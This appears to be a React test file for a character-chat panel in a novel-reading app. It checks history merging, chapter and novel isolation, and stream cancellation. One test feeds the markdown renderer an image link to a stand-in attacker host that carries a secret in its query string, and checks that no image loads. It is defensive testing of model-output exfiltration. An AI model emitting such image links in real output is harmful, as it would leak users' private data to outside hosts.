import React from 'react';
import { render, screen, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { useChatStore } from '@/features/character-chat/model/useChatStore';
import type { Character, ChatMessage } from '@/shared/types';
import { ChatMarkdown, ChatPanel, mergeVisibleChatMessages } from './ChatPanel';

const mocks = vi.hoisted(() => ({
  history: {
    data: [] as ChatMessage[],
    isLoading: false,
    isError: false,
    refetch: vi.fn(),
  },
  historyEnabled: false,
}));

vi.mock('@/features/character-chat/api/useChatHistory', () => ({
  useChatHistory: (_characterId: string, _chapter: number, enabled: boolean) => {
    mocks.historyEnabled = enabled;
    return mocks.history;
  },
}));

const character = {
  id: 'character',
  novel_id: 'novel',
  name: '陈翔',
  aliases: [],
  role: 'protagonist',
  avatar_status: 'pending',
} satisfies Character;

describe('ChatMarkdown', () => {
  it('does not load model-authored image URLs', () => {
    const { container } = render(
      <ChatMarkdown>{'![private memory](https://attacker.invalid/leak?secret=value)'}</ChatMarkdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('private memory')).not.toBeNull();
  });
});

describe('ChatPanel history', () => {
  beforeEach(() => {
    mocks.history.data = [];
    mocks.history.isLoading = false;
    mocks.history.isError = false;
    mocks.history.refetch.mockReset();
    mocks.historyEnabled = false;
    useChatStore.getState().reset();
  });

  it('deduplicates committed turns and hides messages beyond the current chapter', () => {
    const base = {
      character_id: 'character',
      created_at: '2026-08-23T00:00:00Z',
    };
    const history: ChatMessage[] = [{
      ...base, id: 'server-user', turn_id: 'turn-1', role: 'user', content: '你好', chapter_context: 1,
    }];
    const session: ChatMessage[] = [
      { ...base, id: 'local-user', turn_id: 'turn-1', role: 'user', content: '重复', chapter_context: 1 },
      { ...base, id: 'future', turn_id: 'turn-2', role: 'character', content: '未来', chapter_context: 2 },
    ];

    expect(mergeVisibleChatMessages(history, session, 1).map(message => message.content))
      .toEqual(['你好']);
  });

  it('blocks sending until failed history can be retried', () => {
    mocks.history.isError = true;

    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.getByRole('alert').textContent).toContain('对话记录加载失败');
    expect(screen.getByRole('button', { name: '重试加载' })).toBeTruthy();
    expect(screen.getByRole('textbox').hasAttribute('disabled')).toBe(true);
    expect(screen.getByRole('button', { name: '发送消息' }).hasAttribute('disabled')).toBe(true);
  });

  it('waits for committed reading progress before loading history', () => {
    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={2}
        canChat={false}
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(mocks.historyEnabled).toBe(false);
  });

  it('does not render cached messages for a character from another novel', () => {
    const oldMessage: ChatMessage = {
      id: 'old-message',
      role: 'character',
      content: '上一部小说的私密对话',
      character_id: 'character',
      chapter_context: 1,
      created_at: '2026-08-23T00:00:00Z',
    };
    mocks.history.data = [oldMessage];
    useChatStore.setState({ messages: { character: [oldMessage] } });

    const { container } = render(
      <ChatPanel
        character={character}
        novelId="new-novel"
        currentChapter={1}
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(mocks.historyEnabled).toBe(false);
    expect(screen.queryByText('上一部小说的私密对话')).toBeNull();
    expect(container.innerHTML).toBe('');
  });

  it('cancels and hides a stream created in another chapter', async () => {
    const cancel = vi.fn();
    useChatStore.setState({
      streamingText: { character: '第二章的未来内容' },
      isStreaming: { character: true },
      cancelStream: { character: cancel },
      activeTurnId: { character: 'turn-2' },
      activeTurn: {
        character: {
          turnId: 'turn-2',
          characterId: 'character',
          payload: {
            novel_id: 'novel',
            message: '继续',
            current_chapter: 2,
          },
        },
      },
    });

    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.queryByText('第二章的未来内容')).toBeNull();
    await waitFor(() => expect(cancel).toHaveBeenCalledOnce());
  });

  it('cancels and hides a stream from another novel at the same chapter', async () => {
    const cancel = vi.fn();
    useChatStore.setState({
      streamingText: { character: '另一部小说的内容' },
      isStreaming: { character: true },
      cancelStream: { character: cancel },
      activeTurnId: { character: 'turn-old-novel' },
      activeTurn: {
        character: {
          turnId: 'turn-old-novel',
          characterId: 'character',
          payload: {
            novel_id: 'old-novel',
            message: '继续',
            current_chapter: 1,
          },
        },
      },
    });

    render(
      <ChatPanel
        character={{ ...character, novel_id: 'new-novel' }}
        novelId="new-novel"
        currentChapter={1}
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.queryByText('另一部小说的内容')).toBeNull();
    await waitFor(() => expect(cancel).toHaveBeenCalledOnce());
    expect(screen.queryByRole('button', { name: '重试' })).toBeNull();
  });
});
